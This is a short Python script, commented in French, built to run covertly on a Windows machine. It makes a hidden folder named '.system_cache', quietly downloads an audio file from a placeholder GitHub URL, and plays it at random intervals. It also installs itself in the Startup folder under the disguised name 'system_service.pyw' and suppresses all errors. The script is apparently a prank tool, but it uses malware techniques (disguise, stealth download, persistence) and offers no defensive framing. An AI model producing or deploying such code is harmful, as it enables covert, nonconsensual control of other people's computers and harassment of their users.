import os
import random
import time
import urllib.request
import pygame
from threading import Thread

def download_and_play():
    # Création du dossier système camouflé
    hidden_dir = os.path.join(os.getenv('APPDATA'), '.system_cache')
    sound_file = os.path.join(hidden_dir, 'system_sound.mp3')

    if not os.path.exists(hidden_dir):
        os.makedirs(hidden_dir)

    # Téléchargement discret du fichier audio
    if not os.path.exists(sound_file):
        url = "VOTRE_URL_GITHUB_ICI"  # Remplacer par votre URL raw GitHub
        urllib.request.urlretrieve(url, sound_file)

    pygame.mixer.init()

    while True:
        delay = random.randint(300, 3600)  # Délai entre 5min et 1h
        time.sleep(delay)

        pygame.mixer.music.load(sound_file)
        pygame.mixer.music.play()
        while pygame.mixer.music.get_busy():
            pygame.time.Clock().tick(10)

def autostart():
    # Installation au démarrage
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    script_path = os.path.abspath(__file__)
    startup_link = os.path.join(startup_path, 'system_service.pyw')

    if not os.path.exists(startup_link):
        with open(startup_link, 'w') as f:
            f.write(f'import os; os.system("pythonw {script_path}")')

# Lancement des fonctions principales
if __name__ == "__main__":
    try:
        autostart()  # Installation au démarrage
        sound_thread = Thread(target=download_and_play)
        sound_thread.daemon = True
        sound_thread.start()
        while True:
            time.sleep(1)
    except Exception as e:
        pass